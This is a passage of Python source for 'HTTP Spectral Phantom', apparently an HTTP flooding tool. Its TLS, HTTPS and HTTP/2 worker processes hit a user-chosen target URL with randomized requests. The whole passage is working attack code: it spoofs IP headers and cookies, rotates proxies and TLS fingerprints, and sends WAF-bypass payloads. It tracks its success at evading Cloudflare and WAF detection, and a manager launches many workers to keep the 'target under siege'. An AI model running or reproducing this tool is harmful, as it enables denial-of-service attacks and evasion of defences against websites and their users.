            ).encode()
            sock.sendall(request)
            logger.debug(f"TLS request sent: {method} {path}")

            response = b""
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                    if b"Set-Cookie" in response:
                        try:
                            cookie_data = response.decode(errors='ignore').split("Set-Cookie: ")[1].split(";")[0]
                            session_cookies["session"] = cookie_data
                        except IndexError:
                            pass
            except socket.timeout:
                pass
            finally:
                sock.close()

            response_time = time.time() - start_time
            with stats.get_lock():
                stats["total_requests"] += 1
                if b"200" in response:
                    stats["successful_requests"] += 1
                    stats["waf_bypass_success"] += 1
                elif b"403" in response or b"429" in response or b"Cloudflare" in response.lower() or b"WAF" in response.lower():
                    stats["detection_events"] += 1
                    stats["waf_detections"] += 1
                elif b"503" in response:
                    stats["server_errors"] += 1
                stats["total_response_time"] += response_time
                stats["avg_response_time"] = stats["total_response_time"] / stats["total_requests"] if stats["total_requests"] > 0 else 0
                stats["request_rate"] = stats["total_requests"] / (time.time() - stats["start_time"]) if time.time() - stats["start_time"] > 0 else 0
                stats["bypass_rate"] = (stats["waf_bypass_success"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

            adjusted_rate = max(0.1, min(rate_limit, rate_limit * (1 / (1 + response_time))))
            time.sleep(1 / adjusted_rate)
            retry_count = 0

        except Exception as e:
            logger.error(f"TLS worker error: {str(e)}")
            with stats.get_lock():
                stats["detection_events"] += 1
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                logger.warning("Max retries reached, pausing TLS worker")
                time.sleep(5)
                retry_count = 0
            else:
                time.sleep(2 ** retry_count)

# HTTPS Worker (Requests-Based)
def https_worker(target_url, stats, stop_event, rate_limit, proxies):
    session = requests.Session()
    adapter = httpcore.HTTPConnectionPool(max_size=10)
    session.mount("https://", adapter)
    session_cookies = {}
    retry_count = 0
    proxy_list = proxies[:]
    while not stop_event.is_set():
        try:
            geo = random_element(GEO_LOCATIONS)
            tls_fingerprint = random_element(TLS_FINGERPRINTS)
            user_agent = random_element(USER_AGENTS)
            method = random_element(HTTP_METHODS)
            compression = random_element(COMPRESSION_ALGORITHMS)
            payload = {"data": generate_random_string(10, 50)}
            obfuscated_payload = obfuscate_payload(json.dumps(payload))
            waf_payload = random_element(WAF_BYPASS_PAYLOADS)
            path = waf_payload["path"].format(generate_random_string(5, 15), generate_random_string(5, 15))
            path = urllib.parse.quote(path) if random.choice([True, False]) else path
            headers = waf_payload["headers"].copy()
            for k in headers:
                headers[k] = headers[k].format(generate_random_ip(), generate_random_string(5, 15))
            headers.update({
                "User-Agent": user_agent,
                "Accept-Language": geo["lang"],
                "Accept-Encoding": compression,
                "X-Forwarded-For": generate_random_ip(),
                "Cookie": generate_fake_cookie() + (f"; {session_cookies.get('session', '')}" if session_cookies.get('session') else ""),
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "X-JA3-Fingerprint": tls_fingerprint["ja3"],
                "X-TLS-Session-Ticket": secrets.token_hex(16),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Sec-Fetch-Site": random.choice(["same-origin", "cross-site", "none"]),
                "Sec-Fetch-Mode": random.choice(["navigate", "same-origin", "no-cors"]),
                "Sec-Fetch-Dest": random.choice(["document", "iframe", "script", "image"])
            })
            headers = shuffle_headers(randomize_header_case(headers))

            proxy = random.choice(proxy_list) if proxy_list else None
            full_url = f"{target_url.rstrip('/')}{path}"
            logger.debug(f"HTTPS request: {method} {full_url} with proxy {proxy}")

            start_time = time.time()
            for attempt in range(MAX_RETRIES):
                try:
                    if method == "GET":
                        response = session.get(full_url, headers=headers, proxies=proxy, timeout=5, allow_redirects=True)
                    elif method == "POST":
                        response = session.post(full_url, headers=headers, json={"payload": obfuscated_payload}, proxies=proxy, timeout=5)
                    else:
                        response = session.request(method, full_url, headers=headers, proxies=proxy, timeout=5)
                    break
                except Exception as e:
                    logger.debug(f"HTTPS attempt {attempt + 1} failed: {str(e)}")
                    if attempt == MAX_RETRIES - 1:
                        raise
                    time.sleep(2 ** attempt)

            if "Set-Cookie" in response.headers:
                session_cookies["session"] = response.headers["Set-Cookie"].split(";")[0]

            response_time = time.time() - start_time
            logger.debug(f"HTTPS response: {response.status_code}")

            with stats.get_lock():
                stats["total_requests"] += 1
                stats["proxy_usage"] += 1 if proxy else 0
                stats["http2_success"] += 1 if getattr(response.raw, 'version', 11) == 20 else 0
                if response.status_code == 200:
                    stats["successful_requests"] += 1
                    stats["waf_bypass_success"] += 1
                elif response.status_code in [403, 429] or "cloudflare" in response.text.lower() or "waf" in response.text.lower():
                    stats["detection_events"] += 1
                    stats["waf_detections"] += 1
                elif response.status_code == 503:
                    stats["server_errors"] += 1
                stats["total_response_time"] += response_time
                stats["avg_response_time"] = stats["total_response_time"] / stats["total_requests"] if stats["total_requests"] > 0 else 0
                stats["request_rate"] = stats["total_requests"] / (time.time() - stats["start_time"]) if time.time() - stats["start_time"] > 0 else 0
                stats["bypass_rate"] = (stats["waf_bypass_success"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

            adjusted_rate = max(0.1, min(rate_limit, rate_limit * (1 / (1 + response_time))))
            time.sleep(1 / adjusted_rate + random.uniform(0, 0.1))
            retry_count = 0

        except Exception as e:
            logger.error(f"HTTPS worker error: {str(e)}")
            with stats.get_lock():
                stats["detection_events"] += 1
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                logger.warning("Max retries reached, rotating proxy")
                if proxy_list:
                    proxy_list.pop(0)
                time.sleep(5)
                retry_count = 0
            else:
                time.sleep(2 ** retry_count)

# HTTP/2 Worker (Experimental)
def http2_worker(target_url, stats, stop_event, rate_limit, port):
    retry_count = 0
    settings = [
        (0x1, 4096),  # HEADER_TABLE_SIZE
        (0x3, 100),   # MAX_CONCURRENT_STREAMS
        (0x4, 65535), # INITIAL_WINDOW_SIZE
        (0x5, 16384)  # MAX_FRAME_SIZE
    ]
    while not stop_event.is_set():
        try:
            geo = random_element(GEO_LOCATIONS)
            tls_fingerprint = random_element(TLS_FINGERPRINTS)
            user_agent = random_element(USER_AGENTS)
            method = random_element(HTTP_METHODS)
            alpn = "h2"
            compression = random_element(COMPRESSION_ALGORITHMS)
            payload = generate_random_string(10, 50)
            obfuscated_payload = obfuscate_payload(payload)
            waf_payload = random_element(WAF_BYPASS_PAYLOADS)
            path = waf_payload["path"].format(generate_random_string(5, 15), generate_random_string(5, 15))
            path = urllib.parse.quote(path)
            headers = waf_payload["headers"].copy()
            for k in headers:
                headers[k] = headers[k].format(generate_random_ip(), generate_random_string(5, 15))
            headers.update({
                ":method": method,
                ":path": path,
                ":scheme": "https",
                ":authority": urlparse(target_url).hostname,
                "user-agent": user_agent,
                "accept-language": geo["lang"],
                "accept-encoding": compression,
                "x-forwarded-for": generate_random_ip(),
                "cookie": generate_fake_cookie(),
                "x-ja3-fingerprint": tls_fingerprint["ja3"]
            })
            headers = shuffle_headers(randomize_header_case(headers))

            target_ip = resolve_dns(urlparse(target_url).hostname)
            if target_ip == "127.0.0.1":
                logger.warning("Invalid IP, skipping request")
                with stats.get_lock():
                    stats["detection_events"] += 1
                time.sleep(1)
                continue

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.minimum_version = ssl.TLSVersion.TLSv1_2 if tls_fingerprint["version"] == "TLSv1.2" else ssl.TLSVersion.TLSv1_3
            context.set_ciphers(tls_fingerprint["cipher"])
            context.set_ecdh_curve(tls_fingerprint["curve"])
            context.options |= SECURE_OPTIONS
            context.set_alpn_protocols([alpn])
            sock = context.wrap_socket(sock, server_hostname=urlparse(target_url).hostname)

            start_time = time.time()
            for attempt in range(MAX_RETRIES):
                try:
                    sock.connect((target_ip, port))
                    logger.debug(f"HTTP/2 connected to {target_ip}:{port}")
                    break
                except Exception as e:
                    logger.debug(f"HTTP/2 connection attempt {attempt + 1} failed: {str(e)}")
                    if attempt == MAX_RETRIES - 1:
                        raise
                    time.sleep(2 ** attempt)

            # Send HTTP/2 preface and settings
            sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            settings_frame = encode_frame(0, 0x4, encode_settings(settings), flags=0x1)
            sock.sendall(settings_frame)

            # Send headers frame
            headers_data = manual_header_encode(headers).encode()
            headers_frame = encode_frame(1, 0x1, headers_data, flags=0x5)
            sock.sendall(headers_frame)

            # Send data frame if POST
            if method == "POST":
                data_frame = encode_frame(1, 0x0, obfuscated_payload.encode(), flags=0x1)
                sock.sendall(data_frame)

            response = b""
            try:
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
            except socket.timeout:
                pass
            finally:
                sock.close()

            response_time = time.time() - start_time
            with stats.get_lock():
                stats["total_requests"] += 1
                stats["http2_success"] += 1 if b"200" in response else 0
                if b"200" in response:
                    stats["successful_requests"] += 1
                    stats["waf_bypass_success"] += 1
                elif b"403" in response or b"429" in response or b"Cloudflare" in response.lower():
                    stats["detection_events"] += 1
                    stats["waf_detections"] += 1
                elif b"503" in response:
                    stats["server_errors"] += 1
                stats["total_response_time"] += response_time
                stats["avg_response_time"] = stats["total_response_time"] / stats["total_requests"] if stats["total_requests"] > 0 else 0
                stats["request_rate"] = stats["total_requests"] / (time.time() - stats["start_time"]) if time.time() - stats["start_time"] > 0 else 0
                stats["bypass_rate"] = (stats["waf_bypass_success"] / stats["total_requests"] * 100) if stats["total_requests"] > 0 else 0

            adjusted_rate = max(0.1, min(rate_limit, rate_limit * (1 / (1 + response_time))))
            time.sleep(1 / adjusted_rate)
            retry_count = 0

        except Exception as e:
            logger.error(f"HTTP/2 worker error: {str(e)}")
            with stats.get_lock():
                stats["detection_events"] += 1
            retry_count += 1
            if retry_count >= MAX_RETRIES:
                logger.warning("Max retries reached, pausing HTTP/2 worker")
                time.sleep(5)
                retry_count = 0
            else:
                time.sleep(2 ** retry_count)

# Attack Manager
class AttackManager:
    def __init__(self):
        self.stats = Manager().dict({
            "total_requests": 0,
            "successful_requests": 0,
            "waf_bypass_success": 0,
            "detection_events": 0,
            "waf_detections": 0,
            "server_errors": 0,
            "proxy_usage": 0,
            "http2_success": 0,
            "total_response_time": 0,
            "avg_response_time": 0,
            "request_rate": 0,
            "bypass_rate": 0,
            "start_time": time.time()
        })
        self.processes = []
        self.stop_event = multiprocessing.Event()

    def start(self, target_url, port, duration, workers, rate_limit, method, proxies):
        self.stats["start_time"] = time.time()
        target_url = target_url.rstrip('/')
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        target_url = f"{target_url}:{port}" if port != 443 else target_url

        method_name = "TLS" if method == "1" else "HTTPS" if method == "2" else "HTTP/2"
        console.print(Panel(
            f"[bold red]⚔️ HTTP Spectral Phantom Initiated ⚔️\n"
            f"Target: {target_url}\n"
            f"Port: {port}\n"
            f"Duration: {duration}s\n"
            f"Workers: {workers}\n"
            f"Rate Limit: {rate_limit} req/s\n"
            f"Method: {method_name}[/bold red]",
            title="[white on red]⚔️ HTTP Spectral Phantom ⚔️[/white on red]",
            border_style="bold red"
        ))
        logger.info(f"Starting {method_name} attack on {target_url} for {duration}s with {workers} workers")

        for _ in range(workers):
            if method == "1":
                p = multiprocessing.Process(target=tls_worker, args=(target_url, self.stats, self.stop_event, rate_limit, port))
            elif method == "2":
                p = multiprocessing.Process(target=https_worker, args=(target_url, self.stats, self.stop_event, rate_limit, proxies))
            else:
                p = multiprocessing.Process(target=http2_worker, args=(target_url, self.stats, self.stop_event, rate_limit, port))
            self.processes.append(p)
            p.start()

        monitor_thread = threading.Thread(target=monitor_resources, args=(self.stats, self.stop_event))
        monitor_thread.start()

        with Progress(
            TextColumn("[bold red]⚔️ Phantom Progress: {task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console
        ) as progress:
            task = progress.add_task("[red]Target Under Siege...", total=duration)
            start_time = time.time()
            while time.time() - start_time < duration and not self.stop_event.is_set():
                progress.update(task, advance=1)
                time.sleep(1)

        self.stop()

    def stop(self):
        self.stop_event.set()
        console.print(Panel(
            "[bold red]⚔️ Spectral Phantom Terminated! ⚔️[/bold red]",
            title="[white on red]⚔️ Shutdown ⚔️[/white on red]",
            border_style="bold red"
        ))
        logger.info("Terminating all processes")
        for p in self.processes:
            p.terminate()
        for p in self.processes:
            p.join()
        self.processes.clear()

    def display_stats(self):
        while not self.stop_event.is_set():
            table = Table(title="[white on red]⚔️ HTTP Spectral Phantom - Stats ⚔️[/white on red]")
            table.add_column("Metric", style="white")
            table.add_column("Value", style="red")
            table.add_row("Total Requests", str(self.stats["total_requests"]))
            table.add_row("Successful Requests", str(self.stats["successful_requests"]))
            table.add_row("WAF Bypass Success", str(self.stats["waf_bypass_success"]))
            table.add_row("Detection Events", str(self.stats["detection_events"]))
            table.add_row("WAF Detections", str(self.stats["waf_detections"]))
            table.add_row("Server Errors", str(self.stats["server_errors"]))
            table.add_row("Proxy Usage", str(self.stats["proxy_usage"]))
            table.add_row("HTTP/2 Success", str(self.stats["http2_success"]))
            table.add_row("Avg Response Time (s)", f"{self.stats['avg_response_time']:.2f}")
            table.add_row("Request Rate (req/s)", f"{self.stats['request_rate']:.2f}")
            table.add_row("Bypass Rate (%)", f"{self.stats['bypass_rate']:.2f}")
            table.add_row("Uptime (s)", f"{time.time() - self.stats['start_time']:.2f}")
            with Live(table, refresh_per_second=1):
                time.sleep(1)

def main():
    console.print(Panel(
        f"[bold red]⚔️ HTTP Spectral Phantom ⚔️\n"
        f"Developed by: Hamza\n"
        f"Version: 6.0\n"
        f"⚡ Ultimate TLS/HTTPS Manipulation & WAF Bypass ⚡\n"
        f"⚠️ Use responsibly and legally ⚠️[/bold red]",
        title="[white on red]⚔️ HTTP Spectral Phantom ⚔️[/white on red]",
        border_style="bold red"
    ))

    proxies = fetch_proxies()
    logger.info(f"Fetched {len(proxies)} proxies")

    while True:
        try:
            console.print(f"[bold white]Select Method (1: TLS, 2: HTTPS, 3: HTTP/2):[/bold white] ", end="")
            method = input().strip()
            if method not in ["1", "2", "3"]:
                console.print("[bold red]Invalid method. Choose 1 (TLS), 2 (HTTPS), or 3 (HTTP/2).[/bold red]")
                continue

            console.print(f"[bold white]Enter URL (e.g., http://example.com):[/bold white] ", end="")
            target_url = input().strip()
            console.print(f"[bold white]Enter Port (default 443):[/bold white] ", end="")
            port_input = input().strip()
            port = int(port_input) if port_input else 443
            console.print(f"[bold white]Enter Duration (seconds):[/bold white] ", end="")
            duration = int(input().strip())
            console.print(f"[bold white]Enter Number of Workers (default 10):[/bold white] ", end="")
            workers_input = input().strip()
            workers = int(workers_input) if workers_input else 10
            console.print(f"[bold white]Enter Rate Limit (requests/sec, default 10):[/bold white] ", end="")
            rate_limit_input = input().strip()
            rate_limit = int(rate_limit_input) if rate_limit_input else 10

            manager = AttackManager()
            threading.Thread(target=manager.display_stats, daemon=True).start()
            manager.start(target_url, port, duration, workers, rate_limit, method, proxies)
            time.sleep(RESTART_DELAY)
        except ValueError as e:
            console.print(f"[bold red]Invalid input: {str(e)}[/bold red]")
        except KeyboardInterrupt:
            console.print(f"[bold red]Spectral Phantom terminated by user.[/bold red]")
            break
        except Exception as e:
            console.print(f"[bold red]Error: {str(e)}[/bold red]")
            logger.error(f"Main loop error: {str(e)}")

if __name__ == "__main__":
    main()